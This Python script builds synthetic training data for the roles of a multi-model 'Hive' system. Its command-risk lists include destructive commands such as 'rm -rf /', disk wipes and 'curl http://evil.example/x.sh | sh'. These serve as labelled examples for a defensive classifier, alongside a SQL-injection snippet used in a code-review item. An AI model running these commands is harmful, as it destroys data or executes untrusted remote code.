#!/usr/bin/env python
"""Build a checker-validated role SFT dataset for the Hive LFM3 model.

Every generated (prompt, answer) pair is validated with the same deterministic
checkers used by the role benchmark (``experiments/roles/tasks-roles.json``).
Pairs that fail their own checker are dropped, so the corpus cannot teach an
answer the benchmark would reject.

The corpus is synthetic on purpose: the 74 real benchmark prompts are held out
for evaluation. Task families mirror the benchmark shapes (JSON contracts,
choice letters, capacity arithmetic, dependency schedules) but randomize names,
numbers and wording.

Output is TRL conversational format::

    {"prompt": [{"role": "system", ...}, {"role": "user", ...}],
     "completion": [{"role": "assistant", "content": ...}],
     "chat_template_kwargs": {"enable_thinking": false},
     "meta": {"role": ..., "family": ..., "checker": {...}}}

Usage::

    python experiments/build_role_sft.py --out experiments/data/role-sft
"""

from __future__ import annotations

import argparse
import itertools
import json
import random
import re
import sys
from collections import Counter, defaultdict
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from experiments.cascade.checkers import check  # noqa: E402

SYSTEM = {
    "planner": "You are the Hive planner. Return only the requested JSON.",
    "controller": "You are the Hive controller. Return only the requested JSON.",
    "router": "You are the Hive router. Answer with exactly one letter.",
    "face": "You are the Hive face. Answer directly and concisely.",
    "agency": "You are the Hive agency role. Return only the requested answer.",
    "mechanics": "You are the Hive mechanics role. Return only the requested JSON.",
    "judge": "You are the Hive judge. Answer with exactly one letter.",
    "rag": "You are the Hive RAG reader. Use only the provided passage.",
    "risk": "You are the Hive risk classifier. Answer with exactly one letter.",
    "vision": "You are the Hive vision reader. Answer briefly.",
}

LETTERS = "ABC"

# --------------------------------------------------------------------------
# generic helpers
# --------------------------------------------------------------------------


def _letters(n: int) -> list[str]:
    return list(LETTERS[:n])


def _choice_prompt(stem: str, options: list[str], answer: str) -> tuple[str, str]:
    """Return (prompt, gold letter) with options in the given order."""
    lines = " ".join(f"{LETTERS[i]} = {opt}." for i, opt in enumerate(options))
    text = f"{stem} {lines} Answer with exactly one letter."
    if answer not in options:
        raise ValueError(f"answer {answer!r} not in options {options!r}")
    return text, LETTERS[options.index(answer)]


def _topological(nodes: list[str], edges: list[tuple[str, str]],
                 lexicographic: bool = False) -> list[str]:
    remaining = set(nodes)
    incoming = {n: set() for n in nodes}
    for a, b in edges:
        incoming[b].add(a)
    order: list[str] = []
    while remaining:
        ready = [n for n in remaining if not (incoming[n] & remaining)]
        if not ready:
            raise ValueError("cycle")
        nxt = min(ready) if lexicographic else ready[0]
        order.append(nxt)
        remaining.remove(nxt)
    return order


def _waves(nodes: list[str], edges: list[tuple[str, str]]) -> list[list[str]]:
    remaining = set(nodes)
    waves: list[list[str]] = []
    done: set[str] = set()
    while remaining:
        ready = sorted(n for n in remaining if all(a in done for a, b in edges if b == n))
        if not ready:
            raise ValueError("cycle")
        waves.append(ready)
        done.update(ready)
        remaining.difference_update(ready)
    return waves


def _critical_path(tasks: dict[str, int], edges: list[tuple[str, str]]) -> tuple[list[str], int]:
    incoming = {n: [] for n in tasks}
    for a, b in edges:
        incoming[b].append(a)
    best: dict[str, tuple[int, list[str]]] = {}

    def solve(n: str) -> tuple[int, list[str]]:
        if n in best:
            return best[n]
        options = [(0, [])] if not incoming[n] else [solve(p) for p in incoming[n]]
        length, path = max(options, key=lambda item: item[0])
        best[n] = (length + tasks[n], path + [n])
        return best[n]

    length, path = max((solve(n) for n in tasks), key=lambda item: item[0])
    return path, length


def _pack_bins(items: list[int], capacity: int) -> int:
    items = sorted(items, reverse=True)

    def place(i: int, bins: list[int]) -> bool:
        if i == len(items):
            return True
        seen = set()
        for b in range(len(bins)):
            if bins[b] in seen:
                continue
            seen.add(bins[b])
            if bins[b] + items[i] <= capacity:
                bins[b] += items[i]
                if place(i + 1, bins):
                    return True
                bins[b] -= items[i]
        return False

    for k in range(1, len(items) + 1):
        if place(0, [0] * k):
            return k
    return len(items)


def _min_makespan(durations: dict[str, int], workers: int,
                  edges: list[tuple[str, str]], rng: random.Random) -> int | None:
    """Critical-path lower bound, accepted only when a schedule achieves it.

    The minimum cannot be below the critical path. If list scheduling reaches
    that bound, the value is provably optimal; otherwise retry the instance.
    """
    _, lower = _critical_path(durations, edges)
    names = [f"W{i}" for i in range(1, workers + 1)]
    for _ in range(6):
        schedule = _solve_schedule(durations, names, edges, rng)
        if not schedule:
            continue
        makespan = max(int(r["start"]) + durations[str(r["task"])] for r in schedule)
        if makespan == lower:
            return lower
    return None


def _assign_capacity(tasks: dict[str, int], capacities: dict[str, int],
                     rng: random.Random | None = None) -> dict[str, str] | None:
    """Benchmark-style first fit: fill workers in task order.

    The role suite's gold assignments use this convention (fill W1 in task
    order, overflow into W2, then W3), not arbitrary feasible partitions. A
    random DFS teaches valid-but-different assignments that the strict
    ``expected_assignments`` checker rejects.
    """
    loads = {w: 0 for w in capacities}
    out: dict[str, str] = {}
    for task in tasks:
        for w in capacities:
            if loads[w] + tasks[task] <= capacities[w]:
                loads[w] += tasks[task]
                out[task] = w
                break
        else:
            return None
    return out


def _solve_schedule(tasks: dict[str, int], workers: list[str],
                    deps: list[tuple[str, str]], rng: random.Random,
                    release: dict[str, int] | None = None,
                    deadlines: dict[str, int] | None = None,
                    skills: dict[str, str] | None = None,
                    worker_skills: dict[str, list[str]] | None = None,
                    ) -> list[dict[str, object]] | None:
    """List scheduling on a randomized topological order; None if infeasible."""
    release = release or {}
    deadlines = deadlines or {}
    skills = skills or {}
    worker_skills = worker_skills or {}
    incoming = {n: set() for n in tasks}
    for a, b in deps:
        incoming[b].add(a)
    done: set[str] = set()
    free = {w: 0 for w in workers}
    out: list[dict[str, object]] = []
    remaining = set(tasks)
    while remaining:
        ready = sorted(n for n in remaining if not (incoming[n] - done))
        if not ready:
            return None
        rng.shuffle(ready)
        progressed = False
        for task in ready:
            now = max(release.get(task, 0),
                      max((int(r["start"]) + tasks[str(r["task"])]
                           for r in out if str(r["task"]) in incoming[task]), default=0))
            usable = [w for w in workers
                      if not skills.get(task)
                      or skills[task] in worker_skills.get(w, [])]
            if not usable:
                continue
            worker = min(usable, key=lambda w: (max(free[w], now), w))
            start = max(free[worker], now)
            end = start + tasks[task]
            if task in deadlines and end > deadlines[task]:
                continue
            out.append({"task": task, "worker": worker, "start": start})
            free[worker] = end
            done.add(task)
            remaining.remove(task)
            progressed = True
        if not progressed:
            return None
    return out


# --------------------------------------------------------------------------
# corpus builder
# --------------------------------------------------------------------------


class Builder:
    def __init__(self, seed: int = 1337) -> None:
        self.rng = random.Random(seed)
        self.rows: list[dict] = []
        self.failures: Counter[str] = Counter()
        self.attempts: Counter[str] = Counter()

    def add(self, role: str, family: str, prompt: str, answer: str, checker: dict) -> bool:
        self.attempts[family] += 1
        try:
            ok = check({"checker": checker}, answer)
        except Exception:  # noqa: BLE001 - invalid gold is a generator bug, drop it
            ok = False
        if not ok:
            self.failures[family] += 1
            return False
        self.rows.append({
            "prompt": [
                {"role": "system", "content": SYSTEM[role]},
                {"role": "user", "content": prompt},
            ],
            "completion": [{"role": "assistant", "content": answer}],
            "chat_template_kwargs": {"enable_thinking": False},
            # A JSON string keeps pyarrow from inferring a conflicting schema
            # for the heterogeneous checker payloads.
            "meta": json.dumps({"role": role, "family": family, "checker": checker},
                               separators=(",", ":")),
        })
        return True

    def fill(self, family: str, n: int, fn, tries_per_item: int = 8) -> None:
        made = 0
        for _ in range(n * tries_per_item):
            if made >= n:
                break
            try:
                item = fn()
            except Exception:  # noqa: BLE001 - infeasible random instance, retry
                self.failures[family] += 1
                continue
            if item and self.add(*item[:2], *item[2:]):
                made += 1
        if made < n:
            print(f"  ! {family}: wanted {n}, made {made}", flush=True)

    def summary(self) -> dict:
        metas = [json.loads(r["meta"]) for r in self.rows]
        roles = Counter(m["role"] for m in metas)
        families = Counter(m["family"] for m in metas)
        return {
            "rows": len(self.rows),
            "roles": dict(sorted(roles.items())),
            "families": dict(sorted(families.items())),
            "failed_checks": dict(sorted(self.failures.items())),
        }


# --------------------------------------------------------------------------
# router
# --------------------------------------------------------------------------

ROUTER_SIMPLE = [
    "What is {a} * {b}?",
    "What is {a} + {b}?",
    "Convert {a} kilometres to miles.",
    "What is the capital of {place}?",
    "Say hello in {language}.",
    "What time is it in {city} right now?",
    "Rewrite the sentence 'the cat sat on the mat' in the past tense.",
    "Define the word 'ephemeral'.",
    "How many days are in {month}?",
    "Format 2026-10-30 as a friendly date.",
    "What does the command 'df -h' print?",
    "Give me the square root of {square}.",
    "Rename one variable in a single file.",
    "Fix one typo in a comment.",
    "Add a print statement to one function.",
    "Change one default value in a config file.",
    "List the files in this directory.",
]
ROUTER_MEDIUM = [
    "Summarize this {pages}-page PDF into five bullets.",
    "Summarize a {pages}-page report into three bullets.",
    "Compare these two server configs and recommend one: {cfg_a} versus {cfg_b}.",
    "Draft a short reply to a customer asking about a delayed refund.",
    "Extract the invoice number, date, and total from this email.",
    "Explain this Python traceback and suggest a one-line fix.",
    "Write a three-step checklist for rotating an API key.",
    "Refactor this 40-line function to use a context manager.",
    "Rewrite this paragraph for a non-technical reader.",
    "Produce a changelog entry from these five commits.",
    "Turn these meeting notes into action items with owners.",
    "Write a 150-word README section for the training script.",
    "Explain how a KV cache grows with context.",
    "Review this 30-line pull request for style.",
    "Draft a checklist for swapping one model without touching the controller.",
]
ROUTER_COMPLEX = [
    "Plan a safe migration of a {size} GB model library across {drives} drives "
    "without losing the resident controller.",
    "Schedule {n} build jobs on three workers with dependencies and a "
    "{hours}-hour deadline.",
    "Design a capacity plan for two {gb} GB cards that must keep the "
    "controller resident and serve two small models.",
    "Debug a distributed service outage that started after a partial deploy, "
    "using logs from three hosts.",
    "Benchmark ten candidate models across four task families, then choose a "
    "resident set.",
    "Design a data pipeline that ingests {gb} GB per day with a "
    "{hours}-hour recovery SLA.",
    "Refactor a 4,000-line training script into stages without breaking "
    "checkpoint resume.",
    "Write a two-week migration plan for a production database with zero "
    "downtime.",
    "Inspect the repository, find the failing tests, patch the bug, and run "
    "the test suite again.",
    "Read three server logs, correlate their timestamps, identify the memory "
    "leak, patch the code, and verify with a load test.",
    "Read twelve source files, map their dependencies, plan a refactor, update "
    "the tests, and keep the public API stable.",
    "Debug an intermittent race condition across three services using logs, "
    "traces, and code changes.",
    "Compare four architecture options, estimate their costs, and recommend "
    "one with a migration plan.",
    "Coordinate three workers on a six-task build with dependencies, a "
    "deadline, and a skill constraint.",
    "Audit {n} models for quantization loss, run the role suite, and produce a "
    "resident recommendation with a rollback path.",
]
PLACES = ["France", "Japan", "Brazil", "Kenya", "Canada", "Norway"]
LANGUAGES = ["Spanish", "Japanese", "German", "Swahili", "French"]
CITIES = ["Tokyo", "Berlin", "Lima", "Nairobi", "Sydney"]
MONTHS = ["February", "April", "June", "September", "November"]


def router_case(rng: random.Random):
    tier = rng.choices(["simple", "medium", "complex"], weights=[0.33, 0.27, 0.40])[0]
    if tier == "simple":
        tpl = rng.choice(ROUTER_SIMPLE)
        prompt = tpl.format(
            a=rng.randint(2, 99), b=rng.randint(2, 19),
            place=rng.choice(PLACES), language=rng.choice(LANGUAGES),
            city=rng.choice(CITIES), month=rng.choice(MONTHS),
            square=rng.choice([4, 9, 16, 25, 36, 49, 64, 81, 100]),
        )
    elif tier == "medium":
        tpl = rng.choice(ROUTER_MEDIUM)
        prompt = tpl.format(
            pages=rng.randint(12, 60),
            cfg_a=f"{rng.choice(['Scion', 'LFM3', 'Qwen'])} on card {rng.randint(0, 1)}",
            cfg_b=f"{rng.choice(['Scion', 'LFM3', 'Qwen'])} on card {rng.randint(0, 1)}",
        )
    else:
        tpl = rng.choice(ROUTER_COMPLEX)
        prompt = tpl.format(
            size=rng.choice([120, 200, 240, 500]),
            drives=rng.choice([2, 3, 4]),
            n=rng.randint(6, 12),
            hours=rng.choice([4, 8, 12, 24]),
            gb=rng.choice([16, 20, 24, 32]),
        )
    text, letter = _choice_prompt(
        f"Route this request: '{prompt}'",
        ["simple", "medium", "complex"],
        tier,
    )
    return "router", "router-tier", text, letter, {"type": "choice", "expect": letter}


# --------------------------------------------------------------------------
# agency
# --------------------------------------------------------------------------

AGENCY = [
    ("read a local source file", "read_file", ["bash", "web_search"]),
    ("write a new text file", "write_file", ["bash", "web_search"]),
    ("edit one line in a file", "edit_file", ["web_search", "image_gen"]),
    ("run the unit tests", "run_tests", ["web_search", "read_file"]),
    ("search the web for a changelog", "web_search", ["read_file", "bash"]),
    ("generate a logo image", "image_gen", ["write_file", "run_tests"]),
    ("list files in a directory", "bash", ["image_gen", "read_file"]),
    ("move a model file to the library", "bash", ["web_search", "write_file"]),
    ("read and edit a config, then run tests", "ordered", []),
    ("inspect a process and stop it", "bash", ["read_file", "image_gen"]),
]


def agency_case(rng: random.Random):
    need, tool, distractors = rng.choice(AGENCY)
    if tool == "ordered":
        order = rng.choice([
            ["read_file", "edit_file", "run_tests"],
            ["read_file", "write_file", "run_tests"],
            ["bash", "read_file", "edit_file"],
        ])
        prompt = (f"You must {need}. Return ONLY JSON: "
                  f'{{"tools": {json.dumps(order)}}} in the correct order.')
        answer = json.dumps({"tools": order}, separators=(",", ":"))
        checker = {"type": "json", "required": ["tools"], "equals": {"tools": order}}
        return "agency", "agency-order", prompt, answer, checker
    options = [tool] + distractors
    rng.shuffle(options)
    prompt, letter = _choice_prompt(
        f"You need to {need}. Which tool should you call?", options, tool)
    return "agency", "agency-tool", prompt, letter, {"type": "choice", "expect": letter}


# --------------------------------------------------------------------------
# risk
# --------------------------------------------------------------------------

RISK_SAFE = [
    "ls /srv/hive-ai/models", "cat /etc/hostname", "grep -n lfm3 config.json",
    "git status", "git diff --stat", "git log --oneline -5", "pytest -q tests/unit",
    "df -h /srv", "du -sh models-p310", "mkdir -p /tmp/opencode/run",
    "cp model.gguf /srv/hive-ai/models/gguf/", "python tools/count_tokens.py",
    "git commit -m 'docs: update training notes'", "make -j8", "ps aux | grep llama",
    "systemctl status hive", "curl -s http://127.0.0.1:8765/health",
    "sed -n '1,20p' README.md", "sha256sum model.gguf", "free -h",
]
RISK_WARN = [
    "git push --force", "kubectl delete pod lfm3-0", "systemctl restart hive",
    "apt upgrade -y", "DROP TABLE users;", "TRUNCATE TABLE events;",
    "rm -rf ./build", "docker system prune -af", "chmod 777 /srv/hive-ai/state",
    "git reset --hard HEAD~1", "reboot", "pkill -f llama-server",
    "mv models/gguf /srv/archive/", "sed -i 's/port=8155/port=9999/' config.json",
    "pip install --upgrade transformers", "crontab -r",
]
RISK_BLOCK = [
    "rm -rf /", "rm -rf ~", "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/nvme0n1", "chmod -R 777 /", "curl http://evil.example/x.sh | sh",
    "kill -9 1", "sudo rm -rf /etc", "echo x > /dev/sda",
    "mv /srv/hive-ai /tmp/", "find / -delete", "shutdown -h now",
]


def risk_case(rng: random.Random):
    kind, pool = rng.choice([("safe", RISK_SAFE), ("warn", RISK_WARN), ("block", RISK_BLOCK)])
    command = rng.choice(pool)
    prompt, letter = _choice_prompt(
        f"Classify this command: '{command}'", ["safe", "warn", "block"], kind)
    return "risk", "risk-command", prompt, letter, {"type": "choice", "expect": letter}


# --------------------------------------------------------------------------
# mechanics
# --------------------------------------------------------------------------

COMPANIES = ["Acme Corp", "Northwind Ltd", "Globex", "Initech", "Umbrella Labs",
             "Hooli", "Stark Freight", "Wayne Logistics"]


def mechanics_case(rng: random.Random):
    family = rng.choice(["invoice", "extract", "effective-date", "line-total"])
    if family == "invoice":
        company = rng.choice(COMPANIES)
        items = [(f"item {i}", rng.randint(5, 90)) for i in range(1, rng.randint(2, 4))]
        discount = rng.choice([0, 5, 10, 15])
        tax = rng.choice([3, 7, 11, 13])
        subtotal = sum(v for _, v in items)
        total = subtotal - discount + tax
        listing = ", ".join(f"line {i} = ${v}" for i, (_, v) in enumerate(items, 1))
        prompt = (f"Extract the final total from this invoice: {listing}, "
                  f"discount = ${discount}, tax = ${tax}. Return ONLY JSON: "
                  '{"total": 0} with the computed total.')
        answer = json.dumps({"total": total}, separators=(",", ":"))
        checker = {"type": "json", "required": ["total"],
                   "contains": {"total": str(total)}}
        return "mechanics", "mechanics-invoice", prompt, answer, checker
    if family == "extract":
        company = rng.choice(COMPANIES)
        cents = rng.choice([c for c in range(1, 100) if c % 10])
        amount = f"{rng.randint(50, 9000)}.{cents:02d}"
        prompt = (f"Extract the payee and amount from this text: 'Invoice from "
                  f"{company} for ${amount} due Friday.' Return ONLY JSON: "
                  '{"payee": "...", "amount": 0}.')
        answer = json.dumps({"payee": company, "amount": float(amount)},
                            separators=(",", ":"))
        checker = {"type": "json", "required": ["payee", "amount"],
                   "contains": {"payee": company.split()[0].lower(),
                                "amount": amount}}
        return "mechanics", "mechanics-extract", prompt, answer, checker
    if family == "effective-date":
        y = rng.randint(2024, 2027)
        base = f"{y}-01-{rng.randint(10, 28):02d}"
        amended = f"{y}-02-{rng.randint(10, 28):02d}"
        final = f"{y}-03-{rng.randint(1, 28):02d}"
        prompt = (f"A contract was signed {base}. An amendment dated {amended} "
                  f"changed the delivery date to {final}. Return ONLY JSON: "
                  '{"delivery": "YYYY-MM-DD"} with the effective delivery date.')
        answer = json.dumps({"delivery": final}, separators=(",", ":"))
        checker = {"type": "json", "required": ["delivery"],
                   "equals": {"delivery": final}}
        return "mechanics", "mechanics-date", prompt, answer, checker
    qty = rng.randint(2, 9)
    unit = rng.randint(5, 60)
    shipping = rng.choice([0, 5, 9])
    total = qty * unit + shipping
    prompt = (f"Extract the order total: {qty} units at ${unit} each plus "
              f"${shipping} shipping. Return ONLY JSON: "
              '{"qty": 0, "unit": 0, "total": 0}.')
    answer = json.dumps({"qty": qty, "unit": unit, "total": total},
                        separators=(",", ":"))
    checker = {"type": "json", "required": ["qty", "unit", "total"],
               "contains": {"total": str(total)}}
    return "mechanics", "mechanics-line-total", prompt, answer, checker


# --------------------------------------------------------------------------
# rag
# --------------------------------------------------------------------------

RAG_MODELS = [
    ("Scion-35B", 10.56, 32, 0), ("LFM3", 1.02, 64, 1),
    ("d1-2B", 1.72, 8, 1), ("LFM3-VL", 1.72, 8, 1),
    ("Bonsai-27B", 6.71, 16, 0), ("Qwen-35B", 11.7, 32, 0),
]


def rag_case(rng: random.Random):
    family = rng.choice(["context", "card", "difference", "count-fit"])
    a, b = rng.sample(RAG_MODELS, 2)
    passage = (f"{a[0]} is {a[1]:.2f} GB, uses {a[2]}k context, and runs on card "
               f"{a[3]}. {b[0]} is {b[1]:.2f} GB, uses {b[2]}k context, and runs "
               f"on card {b[3]}.")
    if family == "context":
        prompt = (f"Use only this passage: '{passage}' Question: What context "
                  f"does {a[0]} use? Answer with the context size only.")
        return ("rag", "rag-context", prompt, f"{a[2]}k",
                {"type": "contains", "expect": [f"{a[2]}k"]})
    if family == "card":
        prompt = (f"Use only this passage: '{passage}' Question: Which card and "
                  f"context does {b[0]} use? Answer with both values.")
        answer = f"card {b[3]}, {b[2]}k"
        return ("rag", "rag-card", prompt, answer,
                {"type": "contains", "expect": [f"card {b[3]}", f"{b[2]}k"]})
    if family == "difference":
        diff = round(abs(a[1] - b[1]), 2)
        prompt = (f"Use only this passage: '{passage}' How much smaller is "
                  f"{min(a, b, key=lambda m: m[1])[0]} than "
                  f"{max(a, b, key=lambda m: m[1])[0]}? Answer with the number in GB only.")
        return ("rag", "rag-difference", prompt, f"{diff:.2f}",
                {"type": "number", "expect": diff, "tol": 0.02})
    card = rng.randint(0, 1)
    names = [m[0] for m in RAG_MODELS if m[3] == card]
    prompt = (f"Use only this passage: '{passage}' Question: How many of the two "
              f"models run on card {card}? Answer with the number only.")
    answer = str(sum(1 for m in (a, b) if m[3] == card))
    return ("rag", "rag-count", prompt, answer,
            {"type": "number", "expect": float(answer)})


# --------------------------------------------------------------------------
# face
# --------------------------------------------------------------------------

FACE_TOPICS = [
    ("why the sky is blue", "Rayleigh scattering",
     "Rayleigh scattering makes the sky blue because air molecules scatter short "
     "wavelengths more strongly than long ones. That scattered blue light reaches "
     "your eyes from every direction."),
    ("why SSDs are faster than hard drives", "seek time",
     "SSDs have no moving parts, so they avoid the seek time that limits hard "
     "drives. Data is addressed electronically, which makes random reads far faster."),
    ("why checksum verification matters", "checksum",
     "A checksum detects corruption that a byte count cannot see. Verify it before "
     "deleting the source copy."),
    ("why a 35B model needs quantization", "VRAM",
     "A 35B model in bf16 needs about 70 GB of weights, which exceeds one 20 GB "
     "card's VRAM. Quantization shrinks the weights so the model fits."),
    ("why git rebase rewrites history", "commit hash",
     "Rebase replays commits onto a new base, so each replayed commit gets a new "
     "commit hash. Do not rebase shared branches without coordination."),
    ("why a KV cache grows with context", "attention",
     "Every generated token attends to the cached keys and values of earlier "
     "tokens. A longer context therefore needs more attention memory."),
    ("why the controller stays resident", "single-resident",
     "The controller is the merge point for every dispatch, so a single-resident "
     "policy keeps it loaded. Smaller roles can share the display card."),
    ("why benchmarks need held-out tasks", "overfitting",
     "Tuning on the same tasks that score the model rewards memorization. Held-out "
     "tasks measure whether the behavior generalizes."),
]


def face_case(rng: random.Random):
    topic, term, answer = rng.choice(FACE_TOPICS)
    style = rng.choice(["two-sentence", "one-sentence", "word-limit", "term-only"])
    sentences = [s.strip() for s in re.split(r"(?<=[.!?])\s+", answer.strip()) if s.strip()]
    if style == "two-sentence":
        prompt = (f"Explain in exactly two sentences {topic}. Use the term {term}.")
        checker = {"type": "contains", "expect": [term.lower()]}
        return "face", "face-constraint", prompt, answer, checker
    if style == "one-sentence":
        prompt = (f"Explain in exactly one sentence {topic}. Use the term {term}.")
        candidate = next((s for s in sentences if term.lower() in s.lower()), "")
        if not candidate:
            raise ValueError("no term sentence")
        checker = {"type": "contains", "expect": [term.lower()]}
        return "face", "face-constraint", prompt, candidate, checker
    if style == "word-limit":
        prompt = (f"Answer in at most 20 words: {topic}. Use the term {term}.")
        words = answer.split()
        short = " ".join(words[:20])
        if term.lower() not in short.lower():
            short = f"{term} explains {topic}."
        checker = {"type": "contains", "expect": [term.lower()]}
        return "face", "face-constraint", prompt, short, checker
    prompt = (f"Name the effect behind {topic}. Use the term {term}.")
    return "face", "face-term", prompt, f"{term}.", {"type": "contains",
                                                     "expect": [term.lower()]}


# --------------------------------------------------------------------------
# judge
# --------------------------------------------------------------------------

JUDGE_GROUND = [
    ("Scion-35B uses 32k context on card0; LFM3 uses 64k on card1.", "Scion-35B", "32k", "64k"),
    ("Scion-35B is 10.56 GB and uses 32k context; LFM3 is 1.02 GB and uses 64k context.",
     "Scion-35B", "10.56 GB", "1.02 GB"),
    ("d1-2B is 1.72 GB and uses 8k context on card1; LFM3-VL is 1.72 GB and uses 8k context on card1.",
     "d1-2B", "1.72 GB", "10.56 GB"),
    ("The controller runs on the non-display card; LFM3 runs on the display card.",
     "the controller", "the non-display card", "the display card"),
]

JUDGE_CODE = [
    ("`def batch(items, size): return [items[i:i+size] for i in range(0, len(items), size - 1)]`",
     "The step is size-1, so batches overlap; use size.",
     "Looks correct."),
    ("`def median(xs): xs = sorted(xs); return xs[len(xs)//2]`",
     "Wrong for even lengths; it must average the two middle values.",
     "Correct for all input lengths."),
    ("`q = f\"SELECT * FROM users WHERE name = '{name}'\"`",
     "This has a SQL injection risk; use a parameterized query.",
     "The f-string makes it safe."),
    ("`counter = 0` then `def inc(): global counter; counter += 1`",
     "Not thread-safe; counter += 1 is a read-modify-write race and needs a lock.",
     "Thread-safe; the increment is atomic."),
    ("`def load(path): f = open(path); data = f.read(); return data`",
     "Use a context manager so the file closes.",
     "Correct as written."),
    ("`def first(xs): return xs[0]`",
     "This raises IndexError on an empty list; guard it.",
     "This is safe for every list."),
]


def judge_case(rng: random.Random):
    family = rng.choice(["ground", "code", "capacity", "format", "tie", "safety",
                         "feasible", "complete", "command"])
    if family == "ground":
        passage, subject, good, bad = rng.choice(JUDGE_GROUND)
        subject = subject[0].upper() + subject[1:]
        right = f"{subject} uses {good}." if good.endswith("k") or "GB" in good else f"{subject} runs on {good}."
        wrong = f"{subject} uses {bad}." if bad.endswith("k") or "GB" in bad else f"{subject} runs on {bad}."
        pair = [right, wrong]
        rng.shuffle(pair)
        answer = "A" if pair[0] == right else "B"
        prompt = (f"Passage: '{passage}' Answer A says '{pair[0]}' Answer B says "
                  f"'{pair[1]}' Which answer is grounded? Answer with exactly one letter.")
        return "judge", "judge-ground", prompt, answer, {"type": "choice", "expect": answer}
    if family == "code":
        code, good, bad = rng.choice(JUDGE_CODE)
        pair = [f"Review A says '{good}'", f"Review B says '{bad}'"]
        rng.shuffle(pair)
        answer = "A" if good in pair[0] else "B"
        prompt = (f"Code review: {code}. {pair[0]}. {pair[1]}. Which review is "
                  f"better? Answer with exactly one letter.")
        return "judge", "judge-code", prompt, answer, {"type": "choice", "expect": answer}
    if family == "capacity":
        total = rng.choice([16, 20, 24])
        reserve = rng.choice([1, 2])
        weights = round(rng.uniform(8, 18), 2)
        kv = rng.choice([0.5, 1.0, 1.5, 2.0])
        need = round(weights + kv + reserve, 2)
        fits = need <= total - reserve
        good = (f"It fits: {total} - {reserve} = {total - reserve} GB usable, "
                f"and {need} GB is within that." if fits else
                f"It does not fit: {total} - {reserve} = {total - reserve} GB usable, "
                f"but the need is {need} GB.")
        bad = (f"It does not fit because {need} GB exceeds {total} GB." if fits else
               f"It fits because the weights alone are under {total} GB.")
        pair = [good, bad]
        rng.shuffle(pair)
        answer = "A" if pair[0] == good else "B"
        prompt = (f"A model needs {weights} GB of weights and {kv} GB of KV cache. "
                  f"A {total} GB card keeps {reserve} GB free for the system. "
                  f"Answer A says '{pair[0]}' Answer B says '{pair[1]}' Which answer "
                  f"is correct? Answer with exactly one letter.")
        return "judge", "judge-capacity", prompt, answer, {"type": "choice", "expect": answer}
    if family == "format":
        prompt = ('The required output is exactly JSON with keys verdict and reason. '
                  'Answer A: {"verdict":"accept","reason":"tests pass"}. '
                  'Answer B: verdict: accept; reason: tests pass. Which answer follows '
                  'the required format? Answer with exactly one letter.')
        return "judge", "judge-format", prompt, "A", {"type": "choice", "expect": "A"}
    if family == "tie":
        fact = rng.choice(["2 + 2 = 4", "the square has four sides",
                           "card0 is the non-display card", "LFM3 uses 64k context"])
        a = f"{fact}."
        b = f"As stated, {fact}."
        prompt = (f"Answer A: '{a}' Answer B: '{b}' Both answers are correct and "
                  f"equivalent. Which label fits? A = answer A is better, B = answer B "
                  f"is better, T = tie. Answer with exactly one letter.")
        return "judge", "judge-tie", prompt, "T", {"type": "choice", "expect": "T"}
    if family == "feasible":
        n = rng.randint(3, 5)
        nodes = [chr(ord("A") + i) for i in range(n)]
        tasks = {node: rng.randint(1, 4) for node in nodes}
        edges = [(nodes[i], nodes[i + 1]) for i in range(n - 1)]
        workers = ["W1", "W2"]
        schedule = _solve_schedule(tasks, workers, edges, rng)
        if not schedule:
            raise ValueError("no schedule")
        spec = {"type": "schedule", "tasks": {k: {"duration": v} for k, v in tasks.items()},
                "workers": workers, "dependencies": [list(e) for e in edges],
                "deadline": max(int(r["start"]) + tasks[str(r["task"])] for r in schedule) + 2}
        good_plan = ", ".join(f"{r['worker']} {r['task']} {r['start']}-"
                             f"{int(r['start']) + tasks[str(r['task'])]}" for r in schedule)
        bad = [dict(r) for r in schedule]
        target = rng.choice(bad)
        target["start"] = 0
        if check({"checker": spec}, json.dumps({"schedule": bad}, separators=(",", ":"))):
            target["worker"] = "W1" if target["worker"] != "W1" else "W2"
            target["start"] = 0
        if check({"checker": spec}, json.dumps({"schedule": bad}, separators=(",", ":"))):
            raise ValueError("could not corrupt schedule")
        bad_plan = ", ".join(f"{r['worker']} {r['task']} {r['start']}-"
                             f"{int(r['start']) + tasks[str(r['task'])]}" for r in bad)
        pair = [(good_plan, True), (bad_plan, False)]
        rng.shuffle(pair)
        answer = "A" if pair[0][1] else "B"
        prompt = (f"Tasks {', '.join(f'{n}={tasks[n]}' for n in nodes)} on workers "
                  f"{', '.join(workers)}. Dependencies: "
                  f"{'; '.join(f'{a} before {b}' for a, b in edges)}. Plan A: "
                  f"{pair[0][0]}. Plan B: {pair[1][0]}. Which plan is feasible? "
                  "Answer A or B with exactly one letter.")
        return "judge", "judge-feasible", prompt, answer, {"type": "choice", "expect": answer}
    if family == "complete":
        code, reviews, answer = rng.choice([
            ("`def load(path): f = open(path); data = f.read(); return data`",
             ["Correct as written.", "Use a context manager so the file closes.",
              "Use a context manager and handle a missing file."], "C"),
            ("`def fetch(url): return urllib.request.urlopen(url).read()`",
             ["Correct as written.", "Add a timeout and close the response.",
              "Add a timeout, close the response, and handle HTTP errors."], "C"),
            ("`def save(path, data): open(path, 'w').write(data)`",
             ["Correct as written.", "Use a context manager.",
              "Use a context manager and write atomically via a temp file."], "C"),
        ])
        prompt = (f"Code: {code}. Review A: '{reviews[0]}' Review B: '{reviews[1]}' "
                  f"Review C: '{reviews[2]}' Which review is most complete? Answer "
                  "A, B, or C with exactly one letter.")
        return "judge", "judge-complete", prompt, answer, {"type": "choice", "expect": answer}
    if family == "command":
        safe_cmd = rng.choice(RISK_SAFE)
        block_cmd = rng.choice(RISK_BLOCK)
        pair = [(safe_cmd, True), (block_cmd, False)]
        rng.shuffle(pair)
        answer = "A" if pair[0][1] else "B"
        prompt = (f"Which command is safer to run? Answer A = '{pair[0][0]}' "
                  f"Answer B = '{pair[1][0]}' Answer with exactly one letter.")
        return "judge", "judge-command", prompt, answer, {"type": "choice", "expect": answer}
    pairs = [
        ("Run it as root immediately.", "Dry-run it first, then run it as the normal user."),
        ("Delete the backup after the first successful copy.",
         "Keep the source until checksums pass."),
        ("Merge without rerunning the tests.", "Resolve the conflict, rerun the tests, then merge."),
    ]
    bad, good = rng.choice(pairs)
    pair = [good, bad]
    rng.shuffle(pair)
    answer = "A" if pair[0] == good else "B"
